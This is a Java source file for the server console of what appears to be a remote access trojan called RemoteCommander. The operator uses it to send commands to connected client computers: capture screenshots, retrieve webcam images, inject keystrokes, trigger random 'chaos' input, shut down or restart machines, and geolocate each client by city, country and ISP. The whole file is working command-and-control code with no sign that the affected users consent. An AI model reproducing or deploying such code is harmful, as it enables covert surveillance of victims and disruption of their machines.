package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.model.CountryResponse;
import com.maxmind.geoip2.model.IspResponse;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * allows for the control of the clients from the server
 */
public class ClientCommander implements Runnable
{
    /** holds all the clients that are currently connected to the server */
    private Map<InetAddress, ConnectedClient> connectedClients;

    public ClientCommander()
    {
        connectedClients = Server.getOnlineClients();
    }

    public void run()
    {
        try
        {
            waitForCommand();
        }
        catch(NullCommandException | IOException excp)
        {
            System.out.println("run() clientcommander exception");
            excp.printStackTrace();
        }
    }

    /**
     * waits for the user of the server to type a command
     */
    private void waitForCommand() throws NullCommandException, IOException
    {
        while(true)
        {
            System.out.print("> ");
            String command = new Scanner(System.in).nextLine(); // blocks

            if(commandValid(command.split("\\s+")[0]))
                parseAndSendCommand(command);
            else
                System.out.println("> Unknown command: " + command.split("\\s+")[0]);
        }
    }

    /**
     * checks to see if the command exists
     * @param command the command to check
     * @return true if the command is valid, false otherwise
     */
    private boolean commandValid(String command)
    {
        command = command.toLowerCase();
        return command != null || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
    }

    /**
     * properly tokenises commands, allowing for variable length arguments for commands
     * @param fullCommand the full command the user typed
     * @return a list containing each part of the command. Quoted arguments are treated as one part, for example
     * msg all "hello there" will be split into: msg, all, hello there
     */
    private ArrayList<String> tokeniseCommand(String fullCommand)
    {
        ArrayList<String> commandTokens = new ArrayList<>();
        Pattern regex = Pattern.compile("[^\\s\"']+|\"([^\"]*)\"|'([^']*)'"); // allows quoted args to be treated as one
        Matcher regexMatcher = regex.matcher(fullCommand);
        while (regexMatcher.find()) {
            if (regexMatcher.group(1) != null) {
                // Add double-quoted string without the quotes
                commandTokens.add(regexMatcher.group(1));
            } else if (regexMatcher.group(2) != null) {
                // Add single-quoted string without the quotes
                commandTokens.add(regexMatcher.group(2));
            } else {
                // Add unquoted word
                commandTokens.add(regexMatcher.group());
            }
        }
        return commandTokens;
    }

    private void printHelp(String command)
    {
        if(command == null) // user wants full help
            System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_WALLPAPER + " HOST /path/to/local/image/file\n\t" + CMD_ROTATE + " HOST ORIENTATION\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
        else
        {
            if(command.equals(CMD_COUNT))
                System.out.println(CMD_COUNT + " displays the number of currently connected clients.\nExample usage:\n\t" + CMD_COUNT);
            else if(command.equals(CMD_ONLINE))
                System.out.println(CMD_ONLINE + " displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\t" + CMD_ONLINE);
            else if(command.equals(CMD_EJECT))
                System.out.println(CMD_EJECT + " will eject the disk / disk tray on the client.\nExample usage:\n\t" + CMD_EJECT + " 127.0.0.1");
            else if(command.equals(CMD_SHUTDOWN))
                System.out.println(CMD_SHUTDOWN + " will turn off the clients computer.\nExample usage:\n\t" + CMD_SHUTDOWN + " 127.0.0.1");
            else if(command.equals(CMD_RESTART))
                System.out.println(CMD_RESTART + " will restart the clinets computer.\nExample usage:\n\t" + CMD_RESTART + " 127.0.0.1");
            else if(command.equals(CMD_SCREENSHOT))
                System.out.println(CMD_SCREENSHOT + " will take a screenshot of the clients screen.\nExample usage:\n\t" + CMD_SCREENSHOT + " 127.0.0.1");
            else if(command.equals(CMD_SOUND))
                System.out.println(CMD_SOUND + " will play a sound on the clients computer.\nExample usage:\n\t" + CMD_SOUND + " 127.0.0.1 /path/to/local/sound/file");
            else if(command.equals(CMD_MSG))
                System.out.println(CMD_MSG + " will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\t" + CMD_MSG + " 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
            else if(command.equals(CMD_CHAOS))
                System.out.println(CMD_CHAOS + " will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\t" + CMD_CHAOS + " 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
            else if(command.equals(CMD_TYPE))
                System.out.println(CMD_TYPE + " will type the provided message on the clients computer.\nExample usage:\n\t" + CMD_TYPE + " 127.0.0.1 \"this is will get typed out\"");
            else if(command.equals(CMD_RETRIEVE))
                System.out.println(CMD_RETRIEVE + " will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\t" + CMD_RETRIEVE + " 127.0.0.1");
            else if(command.equals(CMD_SYSINFO))
                System.out.println(CMD_SYSINFO + " will return the client's operating system.\nExample usage:\n\t" + CMD_SYSINFO + " 127.0.0.1");
            else if(command.equals(CMD_ROTATE))
                System.out.println(CMD_ROTATE + " will rotate the clients screen depending on the supplied rotation.\nExample usage:\n\t" + CMD_ROTATE + " 127.0.0.1 ORIENTATION\nORIENTATION can be either: left, right, up, down");
            else if(command.equals(CMD_WALLPAPER))
                System.out.println(CMD_WALLPAPER + " will change the clients desktop wallpaper image.\nExample usage:\n\t" + CMD_WALLPAPER + " 127.0.0.1 /path/to/local/image/file");
        }
    }

    /**
     * uses the command input by the server user to execute the command on the
     * specified clients
     * @param fullCommand the users command input. Different commands have different args.
     * @throws UnknownHostException thrown if the host provided is incorrect
     */
    private void parseAndSendCommand(String fullCommand) throws NullCommandException, IOException
    {
        ArrayList<String> commandTokens = tokeniseCommand(fullCommand);
        String command = commandTokens.get(0);

        // Zero argument commands: online, count, help
        // e.g. count
        if(command.equals(CMD_ONLINE))
        {
            printOnlineClients();
            return;
        }

        if(command.equals(CMD_COUNT))
        {
            printOnlineCount();
            return;
        }

        if(command.equals(CMD_HELP))
        {
            if(commandTokens.size() == 2)
                printHelp(commandTokens.get(1));
            else
                printHelp(null);
            return;
        }

        // One argument commands: eject, shutdown, reboot, screenshot, retrieve, os
        // e.g. eject 127.0.0.1
        String host = null;
        if(commandTokens.size() > 1)
            host = commandTokens.get(1);
        if(host == null)
            throw new NullCommandException("Host not provided");

        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
            sendCommandAll(command);
        else // find the specified client
            target = connectedClients.get(InetAddress.getByName(host));

        if(target == null && !host.equals(HOST_ALL))
            throw new UnknownHostException(host + " isn't online or doesn't exist");

        if(!host.equals(HOST_ALL))
            target.sendCommandPart(command); // send the cmd to the specified connected client

        if(command.equals(CMD_SYSINFO))
        {
            target.printClientOSInfo();
            return;
        }

        if(command.equals(CMD_RETRIEVE))
        {
            target.retrieve();
            return;
        }

        // Two argument commands: sound, type, rotate, wallpaper
        // e.g. sound 127.0.0.1 /path/to/sound/file
        String argument = null;
        if(commandTokens.size() == 3)
        {
            argument = commandTokens.get(2);
            if(command.equals(CMD_TYPE))
            {
                if(host.equals(HOST_ALL)) // command has already been sent, just need to send argument now
                    sendCommandAll(argument);
                else
                    target.sendCommandPart(argument); // if the client recieves the msg command it knows to read the next line of input (the msg itself)
            }
            else if(command.equals(CMD_SOUND)) // special as we need to send the sound file to the client
            {
                File sound = new File(argument);
                int size = (int)sound.length();
                if(host.equals(HOST_ALL))
                    sendFileAll(sound, size);
                else
                    target.sendFile(sound, size);
            }
            else if(command.equals(CMD_ROTATE))
            {
                if(host.equals(HOST_ALL))
                    sendCommandAll(argument);
                else
                    target.sendCommandPart(argument);
            }
            else if(command.equals(CMD_WALLPAPER))
            {
                File wallpaper = new File(argument);
                if(host.equals(HOST_ALL))
                    sendFileAll(wallpaper, (int)wallpaper.length());
                else
                    target.sendFile(wallpaper, (int)wallpaper.length());
            }
        }

        // Three argument commands: chaos
        // e.g. chaos all 60000 200
        String length, delay;
        if(commandTokens.size() == 4)
        {
            length = commandTokens.get(2);
            delay = commandTokens.get(3);
            if(host.equals(HOST_ALL))
            {
                sendCommandAll(length);
                sendCommandAll(delay);
            }
            else
            {
                target.sendCommandPart(length);
                target.sendCommandPart(delay);
            }
        }

        // Four argument commands: msg
        // e.g. msg 127.0.0.1 "message here" "title here" warning
        String msg, title, type;
        if(commandTokens.size() == 5)
        {
            msg = commandTokens.get(2);
            title = commandTokens.get(3);
            type = commandTokens.get(4);
            if(host.equals(HOST_ALL))
            {
                sendCommandAll(msg);
                sendCommandAll(title);
                sendCommandAll(type);
            }
            else
            {
                target.sendCommandPart(msg);
                target.sendCommandPart(title);
                target.sendCommandPart(type);
            }
        }
    }

    private void sendFileAll(File toSend, int size) throws IOException
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendFile(toSend, size);
    }

    /**
     * iterates through each connected client and issues the command
     * @param command the command(s) to send to each client
     */
    private void sendCommandAll(String command)
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendCommandPart(command);
    }

    /**
     * called when the "count" command is used
     * prints out the number of currently connected clients
     */
    private void printOnlineCount()
    {
        System.out.println("Online: " + connectedClients.size());
    }

    /**
     * prints online client info including their rough location in the world (city & country) and the ISP detected
     * @throws IOException if the database readers fail to reader the provided database
     */
    private void printOnlineClients() throws IOException
    {
        File countryDB = new File("geolocation/GeoLite2-Country.mmdb");
        File cityDB = new File("geolocation/GeoLite2-City.mmdb");
        DatabaseReader countryReader = new DatabaseReader.Builder(countryDB).build();
        DatabaseReader cityReader = new DatabaseReader.Builder(cityDB).build();
        for(Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
        {
            System.out.print(client.getKey().toString().replace("/", ""));
            try
            {
                CountryResponse country = countryReader.country(client.getKey());
                CityResponse city = cityReader.city(client.getKey());
                IspResponse isp = cityReader.isp(client.getKey());
                System.out.println("\t[ " + city.getCity() + ", " + country.getCountry() + ", " + isp.getIsp() + " ]");
            }
            catch(GeoIp2Exception geoExcp)
            {
                System.out.println("\t[ UNKNOWN ]");
            }
        }

        countryReader.close();
        cityReader.close();
    }
}
